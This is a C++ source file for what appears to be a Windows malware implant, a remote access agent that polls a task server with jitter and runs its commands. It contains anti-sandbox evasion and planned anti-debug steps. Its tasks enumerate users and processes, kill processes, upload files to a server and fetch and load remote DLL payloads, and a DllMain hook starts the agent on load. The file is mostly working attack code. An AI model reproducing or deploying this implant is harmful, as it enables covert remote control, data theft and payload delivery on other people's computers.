#include "main.h"
#include <stdio.h>
#include <iostream>
#include <Tlhelp32.h>
//#include <Lm.h> // definitely need to obfuscate the loading of this DLL(Netapi32.dll), as this add tons of AD functionality


APISTRING apistring;
API api;
MODULELIST modlist;
MODULESTRING modstring;






char* readCommand(void* buffer) {
	return (char*)buffer;
}

void clearCommand(void* buffer) {
	int i = 0;
	char* b = (char*)buffer;
	while (b[i] != 0x00) {
		b[i] = 0x00;
	}
}


void issueCommand(void* buffer, const char* command) {
	int i = 0;
	char* b = (char*)buffer;
	while (true) {
		b[i] = command[i];

		if (command[i] == 0x00) {
			break;
		}
		i++;
	}
}

// IPC_*
void* initModuleComms(std::vector<void*>& modules, std::vector<void*>& argBuffers) {
	std::wstring mapName = L"IPC_";
	std::wstring argBufName = L"ARG_";
	wchar_t mappingNum = *(std::to_wstring(modules.size()).c_str());
	mapName.push_back(mappingNum);
	argBufName.push_back(mappingNum);
	std::wcout << L"Using mapName: " << mapName << std::endl;
	std::wcout << L"Using mapName: " << argBufName << std::endl;
	HANDLE sharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 1 << 12, mapName.c_str());
	void* buffer = MapViewOfFile(sharedMem, FILE_MAP_WRITE, 0, 0, 0);
	HANDLE argMem = CreateFileMappingW(INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 1 << 12, argBufName.c_str());
	void* argBuf = MapViewOfFile(argMem, FILE_MAP_WRITE, 0, 0, 0);
	std::string charStr(mapName.begin(), mapName.end());
	issueCommand(buffer, "load");
	std::cout << "command read: " << readCommand(buffer) << std::endl;
	bool wait = true;
	while (wait) {
		char* ret = readCommand(buffer);
		if (!STRCMP(ret, "initialized")) {
			wait = false;
		}
		Sleep(600);
	}
	


	clearCommand(buffer);
	modules.push_back(buffer);
	argBuffers.push_back(argBuf);
	return buffer;
}









void printDirectory(std::string& contents, std::string dir) {
	namespace fs = std::filesystem;
	bool a = true;
	for (const auto& entry : fs::directory_iterator(dir)) {
		std::string temp = entry.path().generic_string();
		if (!a) {
			contents.append("\n");
		}
		contents.append(temp);
		a = false;
	}
}



void listUsers(std::string& contents) {
	LPUSER_INFO_0 pBuf = NULL;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;
	LPTSTR pszServerName = NULL;
	do 
	{
		nStatus = NetUserEnum((LPCWSTR)pszServerName,
			dwLevel,
			FILTER_NORMAL_ACCOUNT, // global users
			(LPBYTE*)&pBuf,
			dwPrefMaxLen,
			&dwEntriesRead,
			&dwTotalEntries,
			&dwResumeHandle);

		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					assert(pTmpBuf != NULL);

					if (pTmpBuf == NULL)
					{
						break;
					}
					wchar_t* str = pTmpBuf->usri0_name;
					std::wstring ws(L"\n");
					ws.append(str);
					contents.append(ws.begin(), ws.end());
					pTmpBuf++;
					dwTotalCount++;
				}
			}
		}
		else {
			continue;
		}
		if (pBuf != NULL)
		{
			NetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	}
	while (nStatus == ERROR_MORE_DATA); // end do

	if (pBuf != NULL) {
		NetApiBufferFree(pBuf);
	}
	return;

}


void listProcs(std::string& contents) {

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(procEntry);

		if (Process32First(hSnap, &procEntry))
		{
			do
			{
				std::wstring tmp(L"\n");
				tmp.append(procEntry.szExeFile);
				contents.append(tmp.begin(), tmp.end());
				contents.append(":");
				contents.append(std::to_string((int)procEntry.th32ProcessID));
			} while (Process32Next(hSnap, &procEntry));
		}
	}
	CloseHandle(hSnap);

}



void killProcess(std::string& contents, std::string pid) {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bool ret = false;

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(procEntry);

		if (Process32First(hSnap, &procEntry))
		{
			do
			{
				if (atoi(pid.c_str()) == procEntry.th32ProcessID) {
					HANDLE hProc = OpenProcess(PROCESS_TERMINATE, 0, procEntry.th32ProcessID);
					if (hProc) {
						ret = TerminateProcess(hProc, 1);
						CloseHandle(hProc);
					}
				}

			} while (Process32Next(hSnap, &procEntry));
		}
	}
	CloseHandle(hSnap);
	if (ret) {
		contents = "Successfully killed pid:";
		contents.append(pid);
		contents.append("!");
	}
	else {
		contents = "Unable to kill pid:";
		contents.append(pid);
		contents.append(".");
	}
}



// 1. do some sleep calculations for about 30 seconds
// 2. init module list --> lets throw some anti-debug into this
// 3. do some more sleep calculations 20 seconds
// 4. check for sandbox, suspicious processes
// 5. do some more sleep calculations
// 6. fetch stage 1
// 7. 





int main() {

	AllocConsole();
	FILE* f;
	freopen_s(&f, "CONOUT$", "w", stdout);



	void* s_1Command = {0};
	std::vector<void*> modules;
	std::vector<void*> argBuffers;
	//doSomeSleeps(25);
	initModList(&modstring, &modlist, &apistring, &api);
	if (antiSandbox(&api)) {
		//printf("SANDBOX DETECTED\n\n");
		//doSomeSleeps();
		return 0;
	}

	AUTHDATA auth_data;
	auth_data.modifer = 0;
	std::string tmp;
	std::string tmp2;
	auth_data.uuid = tmp;
	auth_data.registraton = TRUE;
	auth_data.pass = tmp2;
	std::string uri = "127.0.0.1/tasks";

	registerAgent(&api, &auth_data);
	//std::cout << auth_data.pass << " <-- uuid\n";

	while (true) {
		
		int jitter = rand() % 10 + 10;
		Sleep(jitter * 1000);
		TASK current_task;
		getTask(&auth_data, uri, &current_task);



		if (current_task.taskNumber == 1) { // print directory
			std::string result;
			printDirectory(result, current_task.args);
			std::cout << result << std::endl;
			current_task.ReturnData = result;
			if (result.length() > 0) {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "SUCCESS");
			}
			else {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "FAILURE");
			}
		}

		else if (current_task.taskNumber == 2) { // lists users
			std::string result;
			listUsers(result);
			current_task.ReturnData = result;
			if (result.length() > 0) {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "SUCCESS");
			}
			else {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "FAILURE");
			}
		}

		else if (current_task.taskNumber == 3) { // list processes
			std::string result;
			listProcs(result);
			current_task.ReturnData = result;
			if (result.length() > 0) {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "SUCCESS");
			}
			else {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "FAILURE");
			}
		}

		else if (current_task.taskNumber == 4) {
			std::string result;
			killProcess(result, current_task.args);
			current_task.ReturnData = result;
			if (result.length() > 0) {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "SUCCESS");
			}
			else {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "FAILURE");
			}

		}

		else if (current_task.taskNumber == 5) {
			std::string result;
			bool res = uploadFile(result, (char*)"127.0.0.1/upload", current_task.args);
			current_task.ReturnData = result;
			if (res) {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "SUCCESS");
			}
			else {
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "FAILURE");
			}

		}

		else if (current_task.taskNumber == 6) {
			std::string result;
			BYTE* file = retrievePayload(&api, &auth_data, current_task.args);
			bool res = loadDLL(file, &api);

			if (res) {
				initModuleComms(modules, argBuffers);
				result = "load success";
				current_task.ReturnData = result;
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "SUCCESS");
			}
			else {
				result = "load failure";
				current_task.ReturnData = result;
				updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "FAILURE");
			}

		}

		else if (current_task.taskNumber == 7) {
			std::string result;
			// args in format [arg][modNumber][function number]
			std::cout << "full args: " << current_task.args << std::endl;
			Sleep(3000);
			char func = current_task.args.back();
			current_task.args.pop_back();
			char moduleNumber = current_task.args.back();
			current_task.args.pop_back();
			std::string arg = current_task.args;
			int num = atoi(&moduleNumber); // extract the correct buffer index
			Sleep(3000);
			printf("module num: %d\n", num);
			printf("module number: %c\n", moduleNumber);
			printf("function num: %c\n", func);
			std::cout << "arg: " << arg << std::endl;
			Sleep(3000);
			void* commandBuf = modules.at(num);
			void* argBuf = argBuffers.at(num);
			issueCommand(commandBuf, &func);
			issueCommand(argBuf, arg.c_str());
			

			//argBuf will read FINISHED when done
			while (true) {
				char* comm = readCommand(commandBuf);
				char* finish = readCommand(argBuf);
				std::cout << finish << std::endl;
				if (!STRCMP(finish, "FINISHED")) {
					break;
				}
				Sleep(jitter * 1000);
			}

			result = readCommand(commandBuf);

			clearCommand(argBuf);
			clearCommand(commandBuf);


			current_task.ReturnData = result;
			updateTask(&auth_data, current_task, (char*)"127.0.0.1/tasks", "SUCCESS");


		}



	}
	
	
}




BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0));
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

